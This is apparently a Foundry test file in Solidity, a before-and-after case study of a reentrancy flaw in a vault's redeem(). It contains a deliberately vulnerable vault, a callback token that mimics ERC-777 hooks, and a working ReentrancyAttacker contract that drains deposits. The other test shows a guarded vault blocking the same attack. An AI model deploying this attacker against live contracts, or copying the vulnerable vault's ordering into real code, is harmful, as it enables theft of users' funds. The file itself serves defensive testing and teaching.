// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// ╔══════════════════════════════════════════════════════════════════════════╗
// ║  Security Case Study CS-01: Reentrancy in vault redeem()               ║
// ║                                                                          ║
// ║  VULNERABILITY                                                           ║
// ║    A vault that transfers assets BEFORE burning shares violates the      ║
// ║    Checks-Effects-Interactions pattern. A malicious ERC-20 token with    ║
// ║    transfer callbacks (like ERC-777 tokensReceived hooks) allows the     ║
// ║    attacker to re-enter redeem() while shares[attacker] is still         ║
// ║    non-zero, withdrawing twice as many assets as they deposited.         ║
// ║                                                                          ║
// ║  FIX                                                                     ║
// ║    1. ReentrancyGuard on every state-changing function.                 ║
// ║    2. CEI order: burn shares FIRST, then transfer assets.               ║
// ║    Both are applied in the real RWAVault (OZ ERC4626 + nonReentrant).  ║
// ║                                                                          ║
// ║  TESTS                                                                   ║
// ║    BEFORE — attack succeeds against VulnerableVault                      ║
// ║    AFTER  — attack is blocked by the real RWAVault                      ║
// ╚══════════════════════════════════════════════════════════════════════════╝

import {Test, console2} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {RWAVault} from "../../src/vault/RWAVault.sol";

// ─── Vulnerable contract ──────────────────────────────────────────────────────

/// @dev Minimal vault that violates CEI: it transfers assets BEFORE burning shares.
///      No ReentrancyGuard. This is the state the contract was in BEFORE the fix.
contract VulnerableVault {
    IERC20 public immutable asset;

    mapping(address => uint256) public shares;
    uint256 public totalShares;

    constructor(IERC20 asset_) {
        asset = asset_;
    }

    function deposit(uint256 amount) external {
        asset.transferFrom(msg.sender, address(this), amount);
        shares[msg.sender] += amount;
        totalShares += amount;
    }

    function redeem(uint256 amount) external {
        require(shares[msg.sender] >= amount, "Insufficient shares");

        // ❌ VULNERABLE: interaction (transfer) happens BEFORE effects (burn)
        //    A callback in asset.transfer() can re-enter here while
        //    shares[msg.sender] is still non-zero.
        asset.transfer(msg.sender, amount);

        // unchecked mirrors pre-0.8 behaviour: after a re-entrant redeem reduces
        // shares to 0, this subtraction wraps rather than reverts, hiding the drain.
        unchecked {
            shares[msg.sender] -= amount;
            totalShares -= amount;
        }
    }

    function totalAssets() external view returns (uint256) {
        return asset.balanceOf(address(this));
    }
}

// ─── Malicious ERC-20 ─────────────────────────────────────────────────────────

/// @dev ERC-20 with a configurable post-transfer callback — simulates ERC-777
///      tokensReceived hooks or any token with transfer-time side-effects.
///      Callback failures are silently swallowed so the outer transfer succeeds.
contract CallbackToken is ERC20 {
    address private _callbackTarget;
    bytes private _callbackData;
    bool private _inCallback;

    constructor() ERC20("Callback Token", "CBT") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function armCallback(address target, bytes calldata data) external {
        _callbackTarget = target;
        _callbackData = data;
    }

    function disarmCallback() external {
        _callbackTarget = address(0);
        _callbackData = "";
    }

    /// @dev After each transfer, fires the armed callback exactly once.
    ///      Mirrors the ERC-777 tokensReceived notification pattern.
    function transfer(address to, uint256 amount) public override returns (bool) {
        bool ok = super.transfer(to, amount);
        if (_callbackTarget != address(0) && !_inCallback) {
            _inCallback = true;
            (bool _ok,) = _callbackTarget.call(_callbackData); // intentionally ignore return value
            _ok;
            _inCallback = false;
        }
        return ok;
    }
}

// ─── Attacker contract ────────────────────────────────────────────────────────

/// @dev Re-enters VulnerableVault.redeem() via the CallbackToken hook.
contract ReentrancyAttacker {
    VulnerableVault public vault;
    CallbackToken public token;
    uint256 private _depositAmount;

    constructor(VulnerableVault vault_, CallbackToken token_) {
        vault = vault_;
        token = token_;
    }

    function attack(uint256 amount) external {
        _depositAmount = amount;

        // 1. Fund attacker and deposit legitimately
        token.transferFrom(msg.sender, address(this), amount);
        token.approve(address(vault), amount);
        vault.deposit(amount);

        // 2. Arm the callback: when we receive tokens from vault, re-enter redeem
        token.armCallback(address(this), abi.encodeCall(this.reenterCallback, ()));

        // 3. First redeem — triggers transfer → callback → second redeem
        vault.redeem(amount);

        // 4. Disarm to avoid infinite recursion in further transfers
        token.disarmCallback();

        // 5. Return all stolen tokens to the caller
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    /// @dev Called by CallbackToken during the first transfer.
    ///      At this point shares[attacker] still equals _depositAmount in the
    ///      vulnerable vault, so we can redeem again for free.
    function reenterCallback() external {
        uint256 myShares = vault.shares(address(this));
        if (myShares > 0) {
            vault.redeem(myShares);
        }
    }
}

// ─── Test contract ────────────────────────────────────────────────────────────

contract ReentrancyCaseStudyTest is Test {
    address public owner   = makeAddr("owner");
    address public victim  = makeAddr("victim");
    address public attacker = makeAddr("attacker");

    uint256 constant VICTIM_DEPOSIT  = 1_000e18;
    uint256 constant ATTACK_DEPOSIT  = 100e18;

    // ── CS-01 BEFORE ──────────────────────────────────────────────────────────

    /// @notice Demonstrates that VulnerableVault (CEI violated, no ReentrancyGuard)
    ///         is drained by a re-entrant redeem() via a callback ERC-20.
    function test_CS01_BEFORE_reentrancy_attackerDoublesTokens() public {
        CallbackToken token = new CallbackToken();
        VulnerableVault vuln = new VulnerableVault(IERC20(address(token)));

        // Victim funds the vault (legitimate user)
        token.mint(victim, VICTIM_DEPOSIT);
        vm.startPrank(victim);
        token.approve(address(vuln), VICTIM_DEPOSIT);
        vuln.deposit(VICTIM_DEPOSIT);
        vm.stopPrank();

        // Attacker has only ATTACK_DEPOSIT but will steal VICTIM_DEPOSIT
        token.mint(attacker, ATTACK_DEPOSIT);
        ReentrancyAttacker atk = new ReentrancyAttacker(vuln, token);

        vm.startPrank(attacker);
        token.approve(address(atk), ATTACK_DEPOSIT);
        atk.attack(ATTACK_DEPOSIT);
        vm.stopPrank();

        uint256 attackerBalance = token.balanceOf(attacker);

        console2.log("Attacker started with:", ATTACK_DEPOSIT);
        console2.log("Attacker ended with:  ", attackerBalance);
        console2.log("Vault assets left:    ", vuln.totalAssets());

        // Exploit succeeded: attacker withdrew twice their deposit
        assertEq(attackerBalance, ATTACK_DEPOSIT * 2, "Attacker should have doubled tokens");
        // Victim's funds were stolen — vault cannot cover remaining shares
        assertLt(vuln.totalAssets(), VICTIM_DEPOSIT, "Vault drained: cannot cover victim");
    }

    // ── CS-01 AFTER ───────────────────────────────────────────────────────────

    /// @notice Demonstrates that RWAVault (nonReentrant + OZ ERC4626 CEI order)
    ///         blocks the same attack: attacker receives only their legitimate deposit.
    function test_CS01_AFTER_reentrancy_fixedVaultBlocksAttack() public {
        CallbackToken token = new CallbackToken();
        // Real vault: redeem() is nonReentrant; OZ ERC4626 _withdraw burns shares
        // BEFORE transferring assets → re-entrant call finds shares == 0 and reverts.
        RWAVault fixed_ = new RWAVault(IERC20(address(token)), "vCBT", "vCBT", owner);

        // Victim funds the vault
        token.mint(victim, VICTIM_DEPOSIT);
        vm.startPrank(victim);
        token.approve(address(fixed_), VICTIM_DEPOSIT);
        fixed_.deposit(VICTIM_DEPOSIT, victim);
        vm.stopPrank();

        // Attacker deposits ATTACK_DEPOSIT
        token.mint(attacker, ATTACK_DEPOSIT);
        vm.startPrank(attacker);
        token.approve(address(fixed_), ATTACK_DEPOSIT);
        uint256 shares = fixed_.deposit(ATTACK_DEPOSIT, attacker);

        // Arm the same callback: try to re-enter redeem() when tokens arrive
        token.armCallback(
            address(fixed_),
            abi.encodeWithSignature(
                "redeem(uint256,address,address)",
                shares, attacker, attacker
            )
        );

        // Attempt the attack — re-entrant call hits nonReentrant and reverts silently
        // (CallbackToken swallows the failure, so the outer redeem still succeeds)
        fixed_.redeem(shares, attacker, attacker);
        token.disarmCallback();
        vm.stopPrank();

        uint256 attackerBalance = token.balanceOf(attacker);

        console2.log("Attacker started with:", ATTACK_DEPOSIT);
        console2.log("Attacker ended with:  ", attackerBalance);
        console2.log("Vault assets (victim):", fixed_.totalAssets());

        // Fix confirmed: attacker got exactly their deposit back — no stolen funds
        assertEq(attackerBalance, ATTACK_DEPOSIT, "Attacker should receive only their deposit");
        // Victim's funds are intact
        assertGe(fixed_.totalAssets(), VICTIM_DEPOSIT, "Victim funds must be intact");
    }
}
